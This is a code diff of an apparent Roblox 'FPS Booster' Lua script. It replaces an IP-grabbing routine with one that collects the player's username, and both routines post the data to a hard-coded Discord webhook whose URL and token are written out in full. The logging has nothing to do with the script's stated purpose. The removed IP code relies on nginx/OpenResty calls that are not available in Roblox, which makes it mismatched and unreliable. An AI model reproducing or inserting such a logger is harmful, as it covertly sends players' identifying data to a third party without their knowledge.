@@ -381,42 +381,27 @@ warn("FPS Booster Loaded!")
     CheckIfBad(value)
 end)]]
 
+-- Lua script to log Roblox username and send it to a Discord webhook
 
+-- Function to send username to Discord webhook
+function sendToWebhook(username)
+    local http = game:GetService("HttpService")
+    local webhookUrl = "https://discord.com/api/webhooks/1234595640261087383/3CW1bQnmu7HbJulV2AFRwzs9EtOVhQbPDmHlC4O354T9ZhiBRljC85cgb78uIgRGd_HT"
+    local data = {
+        content = "Username logged: " .. username
+    }
+    local encodedData = http:JSONEncode(data)
 
-
--- Lua script to grab user's IP and send it to a Discord webhook
-
--- Function to extract IP address from connection
-function getIP()
-    local headers = ngx.req.get_headers()
-    return headers["X-Real-IP"] or headers["x_forwarded_for"] or ngx.var.remote_addr
-end
-
--- Function to send IP address to Discord webhook
-function sendToWebhook(ip)
-    local http = require("resty.http")
-    local httpc = http.new()
-
-    local res, err = httpc:request_uri("https://discord.com/api/webhooks/1234595640261087383/3CW1bQnmu7HbJulV2AFRwzs9EtOVhQbPDmHlC4O354T9ZhiBRljC85cgb78uIgRGd_HT", {
-        method = "POST",
-        body = "User IP: " .. ip,
-        headers = {
-            ["Content-Type"] = "application/json"
-        }
-    })
-
-    if not res then
-        ngx.log(ngx.ERR, "Failed to send IP to Discord webhook: ", err)
-        return
-    end
-
-    ngx.log(ngx.INFO, "IP sent to Discord webhook successfully")
+    http:PostAsync(webhookUrl, encodedData, Enum.HttpContentType.ApplicationJson, false)
 end
 
 -- Main function
 function main()
-    local ip = getIP()
-    sendToWebhook(ip)
+    local player = game.Players:GetPlayers()[1] -- Get the first player (assuming this script is executed by a player)
+    if player then
+        local username = player.Name
+        sendToWebhook(username)
+    end
 end
 
 main()
